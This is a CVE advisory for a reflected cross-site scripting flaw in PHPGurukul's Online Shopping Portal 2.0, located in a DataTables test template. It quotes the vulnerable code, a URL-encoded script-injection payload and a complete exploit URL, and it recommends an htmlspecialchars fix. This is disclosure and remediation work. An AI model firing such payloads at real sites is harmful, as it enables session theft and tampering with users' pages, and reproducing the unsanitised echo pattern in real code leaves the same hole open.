# CVE-2024-10745 - [XSS vulnerability] found in Online Shopping Portal 2.0 - (deferred_table.php)

Affected Project: **Online Shopping Portal**

Exploit Author: Dimitris Chatzidimitris

Platform: Web/Php

Vendor: PHPGurukul

Official Website: (https://phpgurukul.com/shopping-portal-free-download/)

Version: 2.0

Updated: 06 June 2024

Vulnerable path/file: admin/assets/plugins/DataTables/media/unit_testing/templates/deferred_table.php

Injection parameter: `scripts`

<br />

Size: 30.5 MB

Sha256: 127e719bf4236a9140f146dd7a6ae54f2a9234b9e6f0aeda240e7a4905c6e73c

<br />

## Vulnerability Description:
The issue arises in the `$aScripts[$i]` variable that can be influenced by user input directly echoing the constructed `<script>` tag into the HTML output, including the user-controlled part within the src attribute without any sanitization. 
This allows an attacker to inject arbitrary HTML or JavaScript code leading to an XSS attack.

<br />

## Vulnerable code:
```
echo '<script type="text/javascript" language="javascript" src="../'.$aScripts[$i].'?rand='.rand().'"></script>'
```

<br />

## Injection Payload Tested:

We need to set the `scripts` to an encoded url payload to make it work:
```
%22%3E%3C/script%3E%3Cscript%3Ealert('XSS')%3C/script%3E
```

<br />

## Execution:

When the browser parses this, it executes the `%22%3E%3C/script%3E%3Cscript%3Ealert('XSS')%3C/script%3E` code, resulting in a popup displaying `"XSS"`.

<br />

## Demonstration:

Below is how `deferred_table.php` looks like:

<br />

![deferred_table.php](https://i.postimg.cc/qMwR4rL4/1.png)

<br />

Then we can add our payload `%22%3E%3C/script%3E%3Cscript%3Ealert('XSS')%3C/script%3E`:

```
http://localhost/shopping/admin/assets/plugins/DataTables/media/unit_testing/templates/deferred_table.php?scripts=%22%3E%3C/script%3E%3Cscript%3Ealert('XSS')%3C/script%3E
```

<br />

After submitting the url with the payload `%22%3E%3C/script%3E%3Cscript%3Ealert('XSS')%3C/script%3E`, XSS is triggered:

<br />

![xss](https://i.postimg.cc/HLcswyCk/2.png)

<br />

## Recommendation for Preventing XSS:

To fix this vulnerability, we must always sanitize user inputs before rendering them in the HTML. We can use functions like htmlspecialchars() in PHP to encode special characters.

<br />

Example:
```
echo '<script type="text/javascript" language="javascript" src="../' . htmlspecialchars($aScripts[$i], ENT_QUOTES, 'UTF-8') . '?rand=' . rand() . '"></script>';
```

<br />

> One Click Can Change Everything: Be Secure.
